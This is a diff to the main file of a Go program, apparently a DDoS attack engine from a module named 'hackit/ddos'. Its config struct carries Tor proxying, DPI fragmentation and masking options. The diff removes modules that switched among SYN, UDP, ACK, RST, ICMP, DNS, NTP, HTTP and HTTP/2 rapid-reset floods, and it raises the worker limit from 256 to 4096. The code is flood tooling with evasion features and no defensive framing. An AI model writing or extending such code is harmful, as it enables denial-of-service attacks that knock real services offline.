@@ -7,10 +7,6 @@ import (
 	"os/signal"
 	"syscall"
 	"time"
-
-	"hackit/ddos/internal/ai_scheduler"
-	"hackit/ddos/internal/burst_controller"
-	"hackit/ddos/internal/protocol_switcher"
 )
 
 type AttackConfig struct {
@@ -33,6 +29,7 @@ type AttackConfig struct {
 	MethodList          []string `json:"method_list"`
 	H2ConcurrentStreams int      `json:"h2_concurrent_streams"`
 	DpiFragmentCount    int      `json:"dpi_fragment_count"`
+	Size                int      `json:"size"`
 	MixRatio            string   `json:"mix_ratio"`
 	Mask                bool     `json:"mask"`
 	TorProxy            string   `json:"tor_proxy"`
@@ -54,6 +51,15 @@ func errf(format string, args ...interface{}) {
 	os.Stderr.Sync()
 }
 
+func warnf(format string, args ...interface{}) {
+	fmt.Fprintf(os.Stdout, format, args...)
+	os.Stdout.Sync()
+}
+
+func infof(format string, args ...interface{}) {
+	fmt.Fprintf(os.Stdout, format, args...)
+}
+
 func main() {
 	if len(os.Args) < 2 {
 		errf(`{"error":"usage: engine <config.json>"}` + "\n")
@@ -72,8 +78,8 @@ func main() {
 	if cfg.Workers < 1 {
 		cfg.Workers = 10
 	}
-	if cfg.Workers > 256 {
-		cfg.Workers = 256
+	if cfg.Workers > 4096 {
+		cfg.Workers = 4096
 	}
 	if cfg.RateLimit < 1 {
 		cfg.RateLimit = 1000
@@ -88,52 +94,7 @@ func main() {
 	status := make(chan WorkerStats, cfg.Workers)
 	done := make(chan struct{})
 
-	var rateSched *ai_scheduler.AdaptiveRate
-	if cfg.AdaptiveRate {
-		rateSched = ai_scheduler.NewAdaptiveRate(cfg.RateLimit, cfg.RateLimit/10, cfg.RateLimit*2)
-	}
-
-	var cpuMgr *burst_controller.CPUManager
-	if cfg.CorePin {
-		cpuMgr = burst_controller.NewCPUManager()
-	}
-
-	var ifBond *burst_controller.InterfaceBond
-	if len(cfg.Interfaces) > 0 {
-		ifBond = burst_controller.NewInterfaceBond(cfg.Interfaces...)
-	}
-
-	var switchEng *protocol_switcher.SwitchEngine
-	if cfg.AutoSwitch && len(cfg.MethodList) > 0 {
-		methods := make([]int, 0, len(cfg.MethodList))
-		for _, m := range cfg.MethodList {
-			switch m {
-			case "syn":
-				methods = append(methods, protocol_switcher.MethodSYN)
-			case "udp":
-				methods = append(methods, protocol_switcher.MethodUDP)
-			case "ack":
-				methods = append(methods, protocol_switcher.MethodACK)
-			case "rst":
-				methods = append(methods, protocol_switcher.MethodRST)
-			case "icmp":
-				methods = append(methods, protocol_switcher.MethodICMP)
-			case "dns":
-				methods = append(methods, protocol_switcher.MethodDNS)
-			case "ntp":
-				methods = append(methods, protocol_switcher.MethodNTP)
-			case "http":
-				methods = append(methods, protocol_switcher.MethodHTTP)
-			case "h2":
-				methods = append(methods, protocol_switcher.MethodH2RapidReset)
-			}
-		}
-		if len(methods) > 0 {
-			switchEng = protocol_switcher.NewSwitchEngine(methods...)
-		}
-	}
-
-	dispatcher := NewDispatcher(&cfg, status, rateSched, cpuMgr, ifBond, switchEng)
+	dispatcher := NewDispatcher(&cfg, status)
 	go dispatcher.Run(done)
 
 	ticker := time.NewTicker(1 * time.Second)
